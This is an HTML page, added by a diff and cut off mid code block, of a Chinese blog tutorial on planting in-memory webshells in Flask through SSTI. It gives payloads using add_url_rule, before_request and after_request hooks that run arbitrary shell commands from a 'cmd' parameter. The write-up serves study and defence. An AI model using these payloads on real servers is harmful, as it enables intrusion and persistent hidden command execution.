@@ -1,0 +1,582 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Flask内存马 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE"><span class="toc-number">2.</span> <span class="toc-text">debug模式下不出网回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">低版本内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add-url-rule"><span class="toc-number">3.1.</span> <span class="toc-text">add_url_rule</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96app%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.2.</span> <span class="toc-text">获取app上下文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E4%B8%AD-request-ctx-stack"><span class="toc-number">3.2.1.</span> <span class="toc-text">低版本中_request_ctx_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-modules"><span class="toc-number">3.2.2.</span> <span class="toc-text">sys.modules</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">新版内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#before-request"><span class="toc-number">4.1.</span> <span class="toc-text">before_request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-request"><span class="toc-number">4.2.</span> <span class="toc-text">after_request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E7%9A%84%E9%92%A9%E5%AD%90"><span class="toc-number">4.3.</span> <span class="toc-text">其它的钩子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#error-handler-spec"><span class="toc-number">4.3.1.</span> <span class="toc-text">error_handler_spec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#got-first-request"><span class="toc-number">4.4.</span> <span class="toc-text">_got_first_request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.</span> <span class="toc-text">ssti利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E5%88%A9%E7%94%A8"><span class="toc-number">4.6.</span> <span class="toc-text">pickle利用</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Flask内存马</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/9
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/flask/" style="color: #ff7d73">flask</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="color: #00bcd4">内存马</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>年轻人学的第一个内存马，竟然不是java（</p>
+<p>看大伙好像前几个月都在研究这个，学一下，顺带复健一下，已经摸了两周🐟了</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14421">https://xz.aliyun.com/t/14421</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p>
+<span id="more"></span>
+
+<hr>
+<p>先准备一个Flask SSTI漏洞环境：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token string">'guest'</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2>Hello %s!&lt;/h2>'</span> <span class="token operator">%</span> person
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="debug模式下不出网回显"><a href="#debug模式下不出网回显" class="headerlink" title="debug模式下不出网回显"></a>debug模式下不出网回显</h1><p>在debug模式下，报错会带出详细信息，debug模式常见的考点有算pin码进console来命令执行</p>
+<p>其实我们也可以通过手动报错<code>raise Exception()</code>的方式来让我们的命令回显</p>
+<p>payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"raise Exception(__import__('os').popen('whoami').read())"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809214712376.png" alt="image-20240809214712376"></p>
+<hr>
+<p>接下来关闭debug模式，开始研究🐎</p>
+<h1 id="低版本内存马"><a href="#低版本内存马" class="headerlink" title="低版本内存马"></a>低版本内存马</h1><p>payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>因为懒得搞低版本的flask了，这里对payload里的关键部分稍微分析一下就过了</p>
+<p>在eval中，执行了这样一个东西：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">"
+app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span>
+<span class="token string">'/shell'</span><span class="token punctuation">,</span>
+<span class="token string">'shell'</span><span class="token punctuation">,</span>
+<span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+"<span class="token punctuation">,</span>
+<span class="token punctuation">&#123;</span>
+<span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+<span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>很明显，这里调用了Flask对象的<code>add_url_rule</code>方法</p>
+<h2 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule"></a>add_url_rule</h2><p>在Flask中注册路由是使用<code>@app.route()</code>装饰器来实现的，看一下其源码实现：</p>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213132894.png" alt="image-20240809213132894"></p>
+<p>可以看到这里用了<code>add_url_rule</code>来添加路由，这几个参数的说明：</p>
+<ul>
+<li>rule：函数对应的URL规则，满足条件和 app.route() 的第一个参数一样，必须以<code>/</code>开头；</li>
+<li>endpoint：端点，即在使用 url_for() 进行反转的时候，这里传入的第一个参数就是 endpoint 对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为 endpoint 的值；</li>
+<li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号），下面的图对照的就是<code>def home()</code>；</li>
+<li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options &#x3D;添加规则前为False；</li>
+<li>options：要转发到基础规则对象的选项。Werkzeug 的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听 GET（并隐式地侦听HEAD）</li>
+</ul>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213643592.png" alt="image-20240809213643592"></p>
+<p>对照一下payload，可以知道这里添加了一条路由，处理该路由的函数是个由lambda关键字定义的匿名函数</p>
+<hr>
+<h2 id="获取app上下文"><a href="#获取app上下文" class="headerlink" title="获取app上下文"></a>获取app上下文</h2><h3 id="低版本中-request-ctx-stack"><a href="#低版本中-request-ctx-stack" class="headerlink" title="低版本中_request_ctx_stack"></a>低版本中_request_ctx_stack</h3><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例</p>
+<blockquote>
+<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中</p>
+</blockquote>
+<p>也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code>，这里等价于获取了<code>&lt;Flask &#39;app&#39;&gt;</code></p>
+<p>那么<code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>就能获取cmd参数</p>
+<h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span>
+
+url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="新版内存马"><a href="#新版内存马" class="headerlink" title="新版内存马"></a>新版内存马</h1><p>测试版本：Flask 2.2.0</p>
+<p>不知道从哪个版本开始，flask不再支持在程序运行的过程中通过<code>add_url_rule</code>添加路由</p>
+<p>那就得另辟蹊径了</p>
+<p>这里可以利用<code>@app.before_request</code>或者<code>@app.after_request</code>这两个底层函数来打</p>
+<p>接下来先以下面这个路由进行测试：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/e'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> a <span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"1"</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h2><blockquote>
+<p>在 Flask 中，<code>before_request</code> 是一个装饰器，它用于在请求处理之前执行特定的函数。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>像上面这个demo就是检测请求 headers 有无 Authorization 字段来实现身份认证</p>
+<p>跟进一下这个装饰器</p>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004201760.png" alt="image-20240810004201760"></p>
+<p>可以看到这里实际上调用的是</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>作用是：</p>
+<ul>
+<li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li>
+<li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li>
+<li>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</li>
+</ul>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004555015.png" alt="image-20240810004555015"></p>
+<p>那么这个<code>f</code>就是我们添加的函数了，于是我们同样可以自定义一个 lambda 函数，这样在每次发起请求前就都会触发了</p>
+<p>于是可以构造我们的payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810005710518.png" alt="image-20240810005710518"></p>
+<p>第一次写入进去，之后所有的访问请求都会返回123</p>
+<p>不过弊端也很明显，使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务</p>
+<hr>
+<h2 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h2><p>和 before_request 相反，<code>after_request</code>会在请求结束得到响应包之后进行操作</p>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810010120613.png" alt="image-20240810010120613"></p>
+<p>和前面那个一样，唯一要注意的是这个需要定义一个返回值，不然就会报错</p>
+<p>构造payload：（注意，在本人的测试版本上需要提前在代码中导入对应的包才可打入payload）</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>after_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">else</span> resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>函数的内容为：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> <span class="token comment"># 传入参数</span>
+    CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span>      <span class="token comment"># 如果请求参数含有cmd则返回命令执行结果</span>
+    <span class="token keyword">exec</span><span class="token punctuation">(</span>'
